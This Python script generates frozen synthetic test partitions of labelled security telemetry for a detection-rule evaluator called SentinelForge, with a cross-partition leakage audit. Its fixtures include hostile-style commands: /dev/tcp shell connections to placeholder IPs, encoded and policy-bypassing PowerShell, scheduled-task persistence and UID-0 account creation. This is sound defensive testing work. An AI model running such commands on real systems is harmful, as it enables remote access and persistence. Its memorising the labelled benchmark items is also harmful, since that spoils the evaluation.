"""Construct versioned synthetic experiments; commands and scripts are inert fixture text.

The allocation and labels are specified before evaluating candidate detections. Existing
frozen files are never overwritten. Use --check to verify reproducibility and partition
leakage. This corpus is a development artifact, not representative deployment validation.
"""

import argparse
import hashlib
import json
import re
from datetime import datetime, timedelta, timezone
from pathlib import Path
from uuid import UUID

ROOT = Path(__file__).resolve().parents[1]
DESTINATION = ROOT / "data/evaluation-v2"
BASE_REVISION = "78b7bd5c7e17f95993772204d7eaf66a6eec424f"
PLAN = {"development": (24, 12), "validation": (16, 8), "holdout": (16, 8), "robustness": (4, 2)}
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
TASK = r"C:\Windows\System32\schtasks.exe"
HASH_SCRIPT = hashlib.sha256(b"synthetic inert script fixture: download and execute behavior").hexdigest()


def canonical(value):
    return json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=False)


def sha(value):
    return hashlib.sha256(value.encode()).hexdigest()


def rule(number):
    return str(UUID(int=number))


class Partition:
    def __init__(self, name, day):
        self.name = name
        self.day = day
        self.scenarios = []
        self.clock = f"2026-11-{day:02d}T12:00:00Z"

    def add(self, template, suspicious, reason, expected, events, context=None):
        scenario = {
            "id": f"{self.name}-{template}",
            "origin_template": template,
            "session_id": f"{self.name}-session-{len(self.scenarios) + 1:02d}",
            "suspicious": suspicious,
            "reason": reason,
            "expected_rule_ids": [rule(i) for i in expected],
            "events": events,
            "context": context or {},
        }
        self.scenarios.append(scenario)
        return scenario

    def event(self, command=None, process=None, kind="process", **values):
        n = len(self.scenarios) + 1
        payload = {
            "host": f"{self.name}-node-{n:02d}",
            "timestamp": f"2026-11-{self.day:02d}T09:00:00Z",
            "kind": kind,
            "user": f"lab\\operator-{self.name}",
            "external_id": f"session-{self.name}-{n:02d}-event-1",
            **values,
        }
        if command is not None:
            payload["command"] = command
        if process is not None:
            payload["process"] = process
        return {"source": "synthetic", "sensor": f"sensor-{self.name}-{n:02d}", "payload": payload}

    def sysmon(self, command, image=PS, parent=None, **extra):
        normal = self.event(command, image)
        data = normal["payload"]
        payload = {
            "EventID": 1,
            "UtcTime": data["timestamp"],
            "Computer": data["host"],
            "User": data["user"],
            "Image": image,
            "CommandLine": command,
            "RecordID": data["external_id"],
            **extra,
        }
        if parent:
            payload["ParentImage"] = parent
        return {"source": "sysmon", "sensor": normal["sensor"], "payload": payload}

    def bind(self, event):
        payload = event["payload"]
        return {
            "key": "observed-sensor",
            "principal": "evaluation",
            "source": event["source"],
            "sensor": event["sensor"],
            "host": event.get("host") or payload.get("host") or payload.get("Computer"),
            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
            "expires_at": f"2026-11-{self.day:02d}T23:00:00Z",
        }

    def window(self):
        return {
            "valid_from": f"2026-11-{self.day:02d}T08:00:00Z",
            "valid_until": f"2026-11-{self.day:02d}T10:00:00Z",
            "expires_at": f"2026-11-{self.day:02d}T23:00:00Z",
        }

    def approval(self, event, rid, **overrides):
        data = event["payload"]
        return {
            "bindings": [self.bind(event)],
            "approvals": [
                {
                    "binding_key": "observed-sensor",
                    "rule_id": rule(rid),
                    "user": data.get("user") or data["User"],
                    "command_sha256": sha((data.get("command") or data["CommandLine"]).strip()),
                    "reason": "Operator reviewed this exact synthetic administrative action",
                    **self.window(),
                    **overrides,
                }
            ],
        }

    def indicator(self, event, purpose, value, **overrides):
        return {
            "bindings": [self.bind(event)],
            "indicators": [
                {
                    "kind": "sha256" if purpose == "powershell-script" else "ip",
                    "value": value,
                    "purpose": purpose,
                    "version": f"synthetic-research-{self.name}-v1",
                    "provenance": f"urn:sentinelforge:synthetic-experiment:{self.name}:v1",
                    "reason": "Synthetic threat intelligence fixture; not an assertion about a real host",
                    **self.window(),
                    **overrides,
                }
            ],
        }

    def document(self):
        expected_count, expected_positive = PLAN[self.name]
        assert len(self.scenarios) == expected_count
        assert sum(s["suspicious"] for s in self.scenarios) == expected_positive
        return {
            "schema_version": 1,
            "name": "SentinelForge evidence-context experiment",
            "version": "2.0.0",
            "partition": self.name,
            "evaluation_time": self.clock,
            "provenance": "Hand-authored synthetic scenarios; no captured external or deployment telemetry",
            "labeling_criteria": "Assigned action intent is explicit in each scenario reason. No label or scenario metadata is submitted as telemetry. Context is separately configured through authenticated operator APIs. Ambiguous intent-only cases are retained as difficult examples.",
            "independence": "Scenario/template is the unit. Variants within a partition are correlated regression evidence, not independent population observations. Validation and holdout were authored during implementation; neither is representative external validation.",
            "selection_plan": {
                "scenarios": expected_count,
                "positive": expected_positive,
                "negative": expected_count - expected_positive,
                "chosen_before_target_results": True,
            },
            "scenarios": self.scenarios,
        }


def development():
    p = Partition("development", 16)
    e = p.sysmon('PoWeRsHeLl.ExE -EN "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAB4AA=="')
    p.add(
        "encoded-switch-abbreviation",
        True,
        "Suspicious operator-unapproved encoded command; script text alone does not prove compromise",
        [2],
        [e],
    )
    e = p.event(
        'powershell -File "C:\\Staging\\report.ps1" -ExecutionPolicy Bypass',
        PS,
        parent=r"C:\Program Files\Microsoft Office\WINWORD.EXE",
    )
    p.add(
        "document-child-file-bypass",
        True,
        "Synthetic malicious document launches file execution with policy bypass",
        [8],
        [e],
    )
    e = p.event(
        'pwsh -f "C:\\Ops\\collect.ps1"',
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        fields={"script_path": r"C:\Ops\collect.ps1", "script_sha256": HASH_SCRIPT},
    )
    p.add(
        "script-digest-reputation",
        True,
        "Operator-imported synthetic malicious script digest matches the observed file target",
        [8],
        [e],
        p.indicator(e, "powershell-script", HASH_SCRIPT),
    )
    e = p.event(kind="network", dst_ip="8.8.4.4", dst_port=443, fields={"proto": "tcp", "service": "ssl"})
    p.add(
        "bound-https-indicator",
        True,
        "Synthetic exact-IP intelligence identifies the otherwise ordinary-port destination",
        [9],
        [e],
        p.indicator(e, "https-c2", "8.8.4.4"),
    )
    e = p.event(
        'schtasks /create /tn Persistence /tr "C:\\Staging\\runner.exe" /sc minute',
        TASK,
        fields={"approved": True},
    )
    p.add(
        "forged-task-approval-annotation",
        True,
        "Malicious task claims approved=true inside untrusted telemetry",
        [4],
        [e],
    )
    e = p.event("useradd --uid 0 --non-unique service-root", "/usr/sbin/useradd")
    p.add(
        "root-equivalent-account-request", True, "Unapproved creation of a root-equivalent account", [5], [e]
    )
    e = p.event("bash -c 'cat </dev/tcp/198.51.100.20/8443'", "/usr/bin/bash")
    p.add("shell-tcp-read", True, "Synthetic unauthorized shell TCP stream access", [3], [e])
    e = p.event("powershell -File stage.ps1", PS)
    p.add(
        "unobserved-file-content-gap",
        True,
        "Assigned malicious script content is not observed; detection should retain this known context gap",
        [],
        [e],
    )
    e = p.event("powershell -EncodedCommand SQBFAFgA", PS)
    p.add(
        "approval-different-digest",
        True,
        "Malicious encoded command differs from the operator-approved action digest",
        [2],
        [e],
        p.approval(e, 2, command_sha256=sha("a different approved administrative command")),
    )
    e = p.event("powershell -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAB4AA==", PS)
    ctx = p.approval(e, 2, expires_at="2026-11-16T11:59:59Z")
    p.add(
        "approval-expired-at-processing",
        True,
        "Expired operator approval cannot suppress a later-ingested command",
        [2],
        [e],
        ctx,
    )
    e = p.event(kind="network", dst_ip="8.8.8.8", dst_port=4444)
    p.add(
        "public-uncommon-service",
        True,
        "Unapproved synthetic connection on a configured uncommon port",
        [7],
        [e],
    )
    e = p.event("schtasks /create /tn BackupState /tr backup.exe /sc daily", TASK)
    repeat = json.loads(json.dumps(e))
    repeat["payload"]["external_id"] += "-second"
    repeat["payload"]["timestamp"] = "2026-11-16T09:01:00Z"
    p.add(
        "single-use-approval-replayed-action",
        True,
        "One approved operation followed by an unapproved new event with the same command",
        [4],
        [e, repeat],
        p.approval(e, 4),
    )

    e = p.event("powershell -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABvAGsA", PS)
    p.add(
        "reviewed-encoded-inventory",
        False,
        "Exact encoded inventory action is scoped by an operator-issued single-use approval",
        [],
        [e],
        p.approval(e, 2),
    )
    e = p.event("schtasks /create /tn VendorCleanup /tr cleanup.exe /sc weekly", TASK)
    p.add(
        "installer-reviewed-task",
        False,
        "Installer task has an exact command and identity/host-scoped operator approval",
        [],
        [e],
        p.approval(e, 4),
    )
    e = p.event('powershell -File "C:\\Inventory\\daily.ps1"', PS)
    p.add(
        "ordinary-inventory-file",
        False,
        "Routine PowerShell inventory file without suspicious ancestry or script intelligence",
        [],
        [e],
    )
    e = p.event(
        'powershell -File "C:\\Documents\\format.ps1"',
        PS,
        parent=r"C:\Program Files\Microsoft Office\EXCEL.EXE",
    )
    p.add(
        "office-child-without-evasion",
        False,
        "Authorized document automation has no bypass or hidden-window flag",
        [],
        [e],
    )
    e = p.event(
        kind="network", dst_ip="9.9.9.9", dst_port=443, process=r"C:\Program Files\Browser\browser.exe"
    )
    p.add("routine-browser-https", False, "Routine HTTPS browsing without a matching indicator", [], [e])
    e = p.event("python -m pytest tests/unit", "/usr/bin/python3", parent="/usr/bin/make")
    p.add("developer-unit-tests", False, "Routine developer test command", [], [e])
    e = p.event("useradd -u 01005 app-worker", "/usr/sbin/useradd")
    p.add(
        "nonzero-uid-leading-zero",
        False,
        "Ordinary nonzero UID; substring -u 0 is not a root-equivalent identity",
        [],
        [e],
    )
    e = p.event("schtasks /query /fo csv", TASK)
    p.add("task-inventory-query", False, "Task inventory query does not create persistence", [], [e])
    e = p.event(kind="network", dst_ip="10.20.0.4", dst_port=4444)
    p.add(
        "private-security-lab-service",
        False,
        "Private network lab listener is outside globally routable uncommon-port predicate",
        [],
        [e],
    )
    e = p.event(process=PS)
    p.add(
        "missing-command-observation",
        False,
        "No command line was observed; no malicious behavior is asserted by this fixture",
        [],
        [e],
    )
    e = p.event("bash -c uptime", "/bin/bash")
    p.add(
        "exact-replay-benign-shell",
        False,
        "Duplicate delivery of one benign uptime event must not create a signal",
        [],
        [e, json.loads(json.dumps(e))],
    )
    e = p.event("powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgAGEAZABtAGkAbgA=", PS)
    p.add(
        "benign-admin-without-approval",
        False,
        "Assigned authorized administration intentionally lacks independently supplied approval; a known ambiguity retained",
        [2],
        [e],
    )
    return p.document()


def validation():
    p = Partition("validation", 17)
    e = p.sysmon('"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -e SQBFAFgA')
    p.add(
        "quoted-executable-short-encoding",
        True,
        "Operator-unapproved abbreviated encoded argument after a quoted executable",
        [2],
        [e],
    )
    e = p.event(
        'pwsh -WindowStyle Hidden -File "C:\\Users\\Public\\job.ps1"',
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        parent=r"C:\Program Files\Microsoft Office\OUTLOOK.EXE",
    )
    p.add(
        "mail-child-hidden-file",
        True,
        "Synthetic mail-client child uses hidden-window file execution",
        [8],
        [e],
    )
    e = p.event(
        'helper.exe -File "D:\\Scripts\\load.ps1" -ExecutionPolicy Bypass',
        r"D:\Tools\helper.exe",
        parent=r"C:\Program Files\Microsoft Office\POWERPNT.EXE",
        fields={"original_file_name": "PowerShell.EXE"},
    )
    p.add(
        "renamed-presentation-child",
        True,
        "Sensor-observed original filename identifies renamed PowerShell with suspicious parent and bypass",
        [8],
        [e],
    )
    e = p.event("schtasks /create /tn UpdateStage /tr stage.exe /sc onstart", TASK)
    ctx = p.approval(e, 4)
    ctx["bindings"][0]["host"] = "validation-wrong-host"
    p.add(
        "approval-other-host",
        True,
        "Matching action digest with a binding for another host is not an exemption",
        [4],
        [e],
        ctx,
    )
    e = p.event("powershell -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAA1AA==", PS)
    ctx = p.approval(e, 2)
    ctx["approvals"][0]["user"] = "lab\\different-user"
    p.add(
        "approval-other-identity",
        True,
        "Matching action digest with a different observed identity must still alert",
        [2],
        [e],
        ctx,
    )
    events = []
    for sec in [300, 75, 0, 225, 150]:
        event = p.event(
            kind="authentication", outcome="failure", src_ip="192.0.2.60", fields={"service": "sshd"}
        )
        event["payload"]["timestamp"] = (
            datetime(2026, 11, 17, 9, tzinfo=timezone.utc) + timedelta(seconds=sec)
        ).isoformat()
        event["payload"]["external_id"] = f"arrival-{sec}"
        events.append(event)
    p.add(
        "ssh-late-boundary-cluster",
        True,
        "Five failures exactly spanning the 300-second threshold arrive out of order",
        [1],
        events,
    )
    e = p.event("zsh -c 'printf signal >/dev/tcp/203.0.113.88/9443'", "/bin/zsh")
    p.add("zsh-tcp-write", True, "Unauthorized direct shell TCP write", [3], [e])
    e = p.event(kind="network", dst_ip="208.67.222.222", dst_port=443, process=r"C:\ProgramData\worker.exe")
    ctx = p.indicator(e, "https-c2", "208.67.222.222", expires_at="2026-11-17T11:00:00Z")
    p.add(
        "expired-network-intelligence-gap",
        True,
        "Assigned malicious destination has expired intelligence; no current trustworthy evidence should trigger",
        [],
        [e],
        ctx,
    )

    e = p.event("powershell -NoProfile -File untrusted.ps1", PS, parent=r"C:\Windows\explorer.exe")
    p.add(
        "untrusted-name-is-not-verdict", False, "A script filename alone is not malicious evidence", [], [e]
    )
    e = p.event("powershell -ExecutionPolicy Bypass -File BuildAgent.ps1", PS, parent=r"C:\Build\agent.exe")
    p.add(
        "developer-build-policy-bypass",
        False,
        "Build automation uses bypass without Office ancestry or a malicious digest",
        [],
        [e],
    )
    e = p.event(
        kind="network",
        dst_ip="1.0.0.1",
        dst_port=443,
        fields={"service": "ssl", "tls_server_name": "updates.example"},
    )
    p.add(
        "expired-benign-indicator",
        False,
        "Stale synthetic intelligence on ordinary updates is inert",
        [],
        [e],
        p.indicator(e, "https-c2", "1.0.0.1", expires_at="2026-11-17T10:00:00Z"),
    )
    e = p.event('schtasks /create /tn ReportExport /tr "D:\\Apps\\report.exe" /sc monthly', TASK)
    p.add(
        "scheduled-report-approved-boundary",
        False,
        "Approved reporting action is exactly at the inclusive event-time start",
        [],
        [e],
        p.approval(e, 4, valid_from="2026-11-17T09:00:00Z"),
    )
    events = []
    for i in range(5):
        event = p.event(
            kind="authentication", outcome="failure", src_ip=f"192.0.2.{70 + i}", fields={"service": "sshd"}
        )
        event["payload"]["external_id"] = f"source-{i}"
        events.append(event)
    p.add(
        "ssh-distinct-source-retries",
        False,
        "Independent benign single retries do not satisfy a same-source threshold",
        [],
        events,
    )
    e = p.event(
        "powershell -File C:\\Tools\\signed-maintenance.ps1",
        PS,
        fields={"script_path": r"C:\Tools\different.ps1", "script_sha256": HASH_SCRIPT},
    )
    p.add(
        "digest-path-mismatch",
        False,
        "A digest for a different path cannot identify the file being executed",
        [],
        [e],
        p.indicator(e, "powershell-script", HASH_SCRIPT),
    )
    e = p.event("pip install --no-deps package.whl", "/usr/bin/pip")
    p.add(
        "offline-package-installation",
        False,
        "Developer installs a local wheel without monitored suspicious primitives",
        [],
        [e],
    )
    e = p.event(
        "powershell -File lab-demo.ps1 -WindowStyle Hidden",
        PS,
        parent=r"C:\Program Files\Microsoft Office\MSACCESS.EXE",
    )
    p.add(
        "authorized-security-lab-office-chain",
        False,
        "Authorized security-lab exercise intentionally has the same risky observed conjunction; a retained false-positive challenge",
        [8],
        [e],
    )
    return p.document()


def holdout():
    p = Partition("holdout", 18)
    e = p.sysmon(
        'pwsh.exe -NoLogo -EncodedCommand "RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=="',
        image=r"C:\Program Files\PowerShell\7\pwsh.exe",
    )
    p.add("pwsh-literal-encoding", True, "Unapproved encoded PowerShell Core operation", [2], [e])
    e = p.event(
        'powershell -f "E:\\Shared Files\\startup.ps1" -ExecutionPolicy Bypass',
        PS,
        parent=r"C:\Program Files\Microsoft Office\EXCEL.EXE",
    )
    p.add(
        "spreadsheet-file-short-switch",
        True,
        "Spreadsheet child launches a quoted file through the short file option with bypass",
        [8],
        [e],
    )
    e = p.event(
        'pwsh -File "E:\\Tools\\startup.ps1"',
        r"/opt/microsoft/powershell/7/pwsh",
        fields={"script_path": r"e:/tools/STARTUP.ps1", "script_sha256": HASH_SCRIPT},
    )
    p.add(
        "digest-target-path-equivalence",
        True,
        "Observed script digest matches after case and slash normalization of the target",
        [8],
        [e],
        p.indicator(e, "powershell-script", HASH_SCRIPT),
    )
    e = p.event(
        kind="network",
        dst_ip="8.8.8.8",
        dst_port=443,
        fields={"proto": "tcp", "conn_state": "SF", "orig_bytes": 4096},
    )
    ctx = p.indicator(e, "https-c2", "8.8.8.8", valid_until="2026-11-18T09:00:00Z")
    p.add(
        "indicator-inclusive-event-end",
        True,
        "Current synthetic IP evidence is valid at the event-time window end",
        [9],
        [e],
        ctx,
    )
    e = p.event("schtasks /create /tn StartupReentry /tr reentry.exe /sc onlogon", TASK)
    p.add(
        "approval-not-yet-valid",
        True,
        "Action precedes its approval window even though command and host match",
        [4],
        [e],
        p.approval(e, 4, valid_from="2026-11-18T09:00:01Z"),
    )
    e = p.event(
        "powershell -ENC SQBFAFgA",
        PS,
        fields={
            "approved": True,
            "approval_reason": "looks legitimate",
            "original_file_name": "powershell.exe",
        },
    )
    p.add(
        "untrusted-approval-fields",
        True,
        "Telemetry-provided approval text cannot authorize suppression",
        [2],
        [e],
    )
    e = p.event("useradd -o --uid=0 replacement", "/usr/sbin/useradd")
    p.add(
        "uid-equals-option",
        True,
        "Root-equivalent account requested using a valid equals argument form",
        [5],
        [e],
    )
    e = p.event(kind="network", dst_ip="9.9.9.10", dst_port=443, process=r"C:\Users\Public\agent.exe")
    p.add(
        "unobserved-https-command-channel",
        True,
        "Assigned malicious HTTPS intent without threat intelligence or behavioral proof remains an observable-context gap",
        [],
        [e],
    )

    e = p.event(
        'pwsh -File "E:\\Ops\\month-end.ps1" -WindowStyle Hidden',
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        parent=r"C:\Windows\System32\services.exe",
    )
    p.add(
        "service-owned-hidden-report",
        False,
        "Service automation hides a window but lacks the suspicious Office ancestry conjunction",
        [],
        [e],
    )
    e = p.event("powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAG8AcABzAA==", PS)
    p.add(
        "approved-action-end-window",
        False,
        "Exact administrative action is valid at the approval event-time window end",
        [],
        [e],
        p.approval(e, 2, valid_until="2026-11-18T09:00:00Z"),
    )
    e = p.event("schtasks /create /tn HealthPulse /tr monitor.exe /sc hourly", TASK)
    p.add(
        "approved-event-idempotent-retry",
        False,
        "Repeated delivery of the same approved event is a duplicate, not a second use",
        [],
        [e, json.loads(json.dumps(e))],
        p.approval(e, 4),
    )
    e = p.event(
        kind="network", dst_ip="1.1.1.2", dst_port=443, fields={"service": "https", "orig_bytes": 1200}
    )
    ctx = p.indicator(e, "https-c2", "1.1.1.3")
    p.add(
        "intelligence-address-near-match",
        False,
        "Nearby IP address is not an exact intelligence match",
        [],
        [e],
        ctx,
    )
    e = p.event(
        "powershell -File C:\\Ops\\inventory-delta.ps1",
        PS,
        fields={"script_path": r"C:\Ops\inventory-delta.ps1", "script_sha256": HASH_SCRIPT},
    )
    ctx = p.indicator(e, "powershell-script", HASH_SCRIPT)
    ctx.pop("bindings")
    p.add(
        "unbound-digest-claim",
        False,
        "Collector claim lacks an enrolled identity/sensor/host binding; hash annotation is not trusted enrichment",
        [],
        [e],
        ctx,
    )
    e = p.event("/usr/bin/git status --porcelain=v1", "/usr/bin/git", parent="/usr/bin/code")
    p.add(
        "editor-source-control",
        False,
        "Editor checks repository status without monitored persistence or execution signals",
        [],
        [e],
    )
    e = p.event("useradd --uid 2000 --create-home builder", "/usr/sbin/useradd")
    p.add("nonprivileged-build-account", False, "Provisioning a non-root build account", [], [e])
    events = []
    for i, sec in enumerate([0, 80, 160, 240, 301]):
        event = p.event(
            kind="authentication", outcome="failure", src_ip="192.0.2.120", fields={"service": "sshd"}
        )
        event["payload"]["timestamp"] = (
            datetime(2026, 11, 18, 9, tzinfo=timezone.utc) + timedelta(seconds=sec)
        ).isoformat()
        event["payload"]["external_id"] = f"retry-{i}"
        events.append(event)
    p.add(
        "ssh-beyond-threshold-window",
        False,
        "Benign stale-credential retries span 301 seconds and never form the five-event 300-second cluster",
        [],
        events,
    )
    return p.document()


def robustness():
    p = Partition("robustness", 19)
    e = p.event("powershell -enc SQBFAFgA", PS)
    e["payload"]["timestamp"] = "2026-11-19T09:00:00"
    p.add(
        "naive-time-rejection",
        True,
        "A suspicious record with an ambiguous timestamp must be an ingestion ERROR, not FN/TN",
        [2],
        [e],
    )
    e = {"source": "sysmon", "sensor": "malformed-sysmon", "payload": {"Event": None}}
    p.add(
        "malformed-sysmon-object",
        False,
        "Malformed sensor shape must fail evaluation integrity regardless of benign assigned intent",
        [],
        [e],
    )
    e = p.event(kind="network", dst_ip="not-an-ip", dst_port=443)
    p.add(
        "invalid-address-rejection",
        True,
        "Invalid address cannot silently become a benign prediction",
        [],
        [e],
    )
    e = p.event("id", "/usr/bin/id")
    e["payload"]["unsupported_top_level"] = True
    p.add(
        "unknown-normalized-field",
        False,
        "Unsupported normalized field must remain a reported rejection",
        [],
        [e],
    )
    return p.document()


def build_documents():
    return {
        name: fn()
        for name, fn in [
            ("development", development),
            ("validation", validation),
            ("holdout", holdout),
            ("robustness", robustness),
        ]
    }


VOLATILE_KEYS = {
    "host",
    "computer",
    "timestamp",
    "utctime",
    "ts",
    "sensor",
    "user",
    "external_id",
    "recordid",
    "session_id",
    "id",
    "reason",
    "provenance",
    "version",
    "expires_at",
    "valid_from",
    "valid_until",
    "key",
    "binding_key",
    "principal",
}


def structural(value):
    """Remove attribution/clock bookkeeping; retain commands, source and decision context."""
    if isinstance(value, dict):
        return {
            k.casefold(): structural(v) for k, v in sorted(value.items()) if k.casefold() not in VOLATILE_KEYS
        }
    if isinstance(value, list):
        return [structural(v) for v in value]
    if isinstance(value, str):
        return re.sub(r"\s+", " ", value.strip().casefold()).replace("\\", "/")
    return value


def behavior_tokens(scenario):
    """Conservative review heuristic, not proof of semantic independence.

    Near matches compare values after stripping timestamps/host identities; token bigrams
    retain commands and context. Exact structural collisions are reported independently.
    """
    observed = structural({"events": scenario["events"], "context": scenario.get("context", {})})
    tokens = re.findall(r"[a-z0-9_.:-]+", canonical(observed))
    return set(zip(tokens, tokens[1:]))


def audit_partitions(documents):
    rows = [
        (partition, s)
        for partition, doc in documents.items()
        if partition != "robustness"
        for s in doc["scenarios"]
    ]
    exact, near, templates, sessions, hosts = [], [], [], [], []
    for i, (left_part, left) in enumerate(rows):
        for right_part, right in rows[i + 1 :]:
            if left_part == right_part:
                continue
            pair = {"partitions": [left_part, right_part], "scenarios": [left["id"], right["id"]]}
            if left["origin_template"] == right["origin_template"]:
                templates.append(pair)
            if left["session_id"] == right["session_id"]:
                sessions.append(pair)

            def hostset(scenario):
                return {
                    e.get("host") or e.get("payload", {}).get("host") or e.get("payload", {}).get("Computer")
                    for e in scenario["events"]
                    if isinstance(e.get("payload"), dict)
                } - {None}

            if hostset(left) & hostset(right):
                hosts.append(pair)
            a = structural({"events": left["events"], "context": left.get("context", {})})
            b = structural({"events": right["events"], "context": right.get("context", {})})
            if canonical(a) == canonical(b):
                exact.append(pair)
            ta, tb = behavior_tokens(left), behavior_tokens(right)
            similarity = len(ta & tb) / len(ta | tb) if ta or tb else 1.0
            if similarity >= 0.8:
                near.append(pair | {"jaccard_token_bigram_similarity": round(similarity, 4)})
    return {
        "method": "Cross-partition template/session/host equality; exact structure with attribution and timestamps removed; structural token-bigram Jaccard >=0.80 candidates. Candidate list is retained for review, not automatically called independent.",
        "cross_partition_exact_structure": exact,
        "cross_partition_near_candidates": near,
        "cross_partition_template_collisions": templates,
        "cross_partition_session_collisions": sessions,
        "cross_partition_host_collisions": hosts,
        "partition_counts": {
            name: {
                "scenarios": len(doc["scenarios"]),
                "positive": sum(s["suspicious"] for s in doc["scenarios"]),
                "negative": sum(not s["suspicious"] for s in doc["scenarios"]),
            }
            for name, doc in documents.items()
        },
    }


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--check", action="store_true")
    parser.add_argument("--output-dir", type=Path, default=DESTINATION)
    args = parser.parse_args()
    docs = build_documents()
    encoded = {
        name + ".json": json.dumps(doc, indent=2, ensure_ascii=False) + "\n" for name, doc in docs.items()
    }
    audit = audit_partitions(docs)
    if args.check:
        manifest = json.loads((args.output_dir / "manifest.json").read_text())
        for name, content in encoded.items():
            assert (args.output_dir / name).read_text() == content, f"Regeneration mismatch: {name}"
            assert manifest["files"][name] == sha(content), f"Frozen hash mismatch: {name}"
        assert json.loads((args.output_dir / "leakage-audit.json").read_text()) == audit
        assert not audit["cross_partition_exact_structure"], "Exact structural leakage"
        assert not audit["cross_partition_template_collisions"], "Template leakage"
        assert not audit["cross_partition_session_collisions"], "Session leakage"
        assert not audit["cross_partition_host_collisions"], "Host leakage"
        print("Frozen corpus hashes, deterministic regeneration and structural split checks pass.")
        return
    if any((args.output_dir / name).exists() for name in [*encoded, "manifest.json"]):
        parser.error(
            "Frozen corpus exists; do not overwrite. A replacement requires a new version and retirement record."
        )
    args.output_dir.mkdir(parents=True, exist_ok=True)
    for name, content in encoded.items():
        (args.output_dir / name).write_text(content)
    (args.output_dir / "leakage-audit.json").write_text(json.dumps(audit, indent=2) + "\n")
    manifest = {
        "version": "2.0.0",
        "frozen_at": datetime.now(timezone.utc).isoformat(),
        "base_revision": BASE_REVISION,
        "files": {name: sha(content) for name, content in encoded.items()},
        "acceptance_dataset": "holdout.json",
        "freeze_policy": "Frozen before candidate detector tuning/evaluation. If holdout informs any fix, retire it as development evidence and freeze a new version. Never adjust labels, remove failures or add easy cases to repair a target.",
        "scope": "Synthetic development-time evidence; no claim of independent deployment validation or population efficacy",
        "near_duplicate_policy": "All >=0.80 candidates are published for manual review; unresolved candidate leakage invalidates an independent-holdout interpretation.",
    }
    (args.output_dir / "manifest.json").write_text(json.dumps(manifest, indent=2) + "\n")
    print(
        json.dumps(
            {
                "files": manifest["files"],
                "counts": audit["partition_counts"],
                "near_candidates": len(audit["cross_partition_near_candidates"]),
                "exact_collisions": len(audit["cross_partition_exact_structure"]),
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    main()
